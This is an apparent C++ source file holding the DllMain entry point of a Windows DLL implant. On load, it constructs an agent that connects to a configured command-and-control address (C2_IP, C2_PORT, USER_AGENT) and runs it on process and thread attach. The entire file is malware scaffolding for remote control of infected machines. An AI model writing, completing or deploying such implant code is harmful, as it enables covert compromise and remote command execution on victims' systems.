#pragma once

#define WIN32_LEAN_AND_MEAN             // Exclude rarely-used stuff from Windows headers
// Windows Header Files
#include <Windows.h>

#include "Agent.h"
#include "Request.h"
#include "Command.h"
#include "Config.h"
#include "Util.h"


BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	auto nReq = Request(C2_IP, C2_PORT, USER_AGENT);
	auto nCommand = Command();
	auto agent = Agent(nReq, nCommand);

	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
		agent.run();
		break;
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:

		break;
	}
	return TRUE;
}